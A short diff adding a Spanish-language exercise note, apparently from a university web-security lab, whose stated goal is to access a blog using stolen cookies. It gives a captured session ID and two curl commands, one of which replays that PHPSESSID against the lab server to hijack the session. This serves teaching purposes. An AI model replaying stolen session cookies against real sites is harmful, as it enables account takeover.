@@ -1,0 +1,19 @@
+Ejercicio: 5
+
+Objetivo:
+    acceder a al blog identificándonos mediante las cookies robadas
+
+Punto de entrada:
+    http://muses.gii.upv.es:8080/
+
+Datos:
+    q7e02q025oldsp812pt7cbjtja
+
+URL:
+    curl -b "PHPSESSID=" http://muses.gii.upv.es:8080/ > muses-index-without-session.html 
+    curl -b "PHPSESSID=q7e02q025oldsp812pt7cbjtja" http://muses.gii.upv.es:8080/ > muses-index-stolen-session.html
+
+
+Identificador:
+    20210430-135838 a57433b8946a4f883e27b354adf4a471
+    20210430-140041 97803f5b8090bbd7b8e9be3805fa570d
